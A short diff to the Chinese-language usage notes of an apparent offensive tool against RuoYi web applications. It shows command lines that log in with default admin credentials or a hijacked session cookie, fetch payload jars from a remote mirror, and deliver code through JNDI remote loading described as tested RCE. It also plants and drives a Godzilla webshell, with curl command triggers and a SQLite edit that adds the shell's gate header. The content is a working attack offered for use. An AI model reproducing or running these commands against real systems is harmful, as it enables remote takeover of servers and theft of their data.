@@ -32,6 +32,7 @@ java -jar ruoyi-gzms.jar --url http://target:8080 --user admin --pass admin123
 java -jar ruoyi-gzms.jar --url http://target:8080 --cookie "JSESSIONID=..."
 # 选项
 #   --jar-url URL   自建载荷镜像（默认上面的 GitHub raw 地址）
+#   --jndi URL      JNDI 远程加载投递（自建 JYso/ysomap 服务，实测 RCE）
 #   --gz-pass P --gz-key K   载荷 jar 里的哥斯拉 pass/key
 #   --proxy host:port
 #   --no-cleanup    保留临时任务和被改写的 job1
@@ -85,6 +86,7 @@ curl.exe -s "http://target:8080/login?cmd=whoami"                               
 # 必须补门禁头（char(13,10) 才是真 CRLF）：
 sqlite3 dist/data.db "UPDATE shell SET headers='X-Cmd-Ruoyi: 1'||char(13,10)||'Accept: */*'||char(13,10)||'Connection: close'||char(13,10) WHERE id='<uuid>';"
 # macOS 跑 GodzillaCli 不要带 -Djava.awt.headless=true，cwd 在 dist/
+# 顺序必须 add → sqlite 补头 → test/exec（乱序首测会报 HeadlessException 噪音）
 java -Dfile.encoding=UTF-8 -cp "godzilla-cli.jar:Godzilla2-rebuilt.jar" shells.cli.GodzillaCli test --id <uuid>
 ```
 
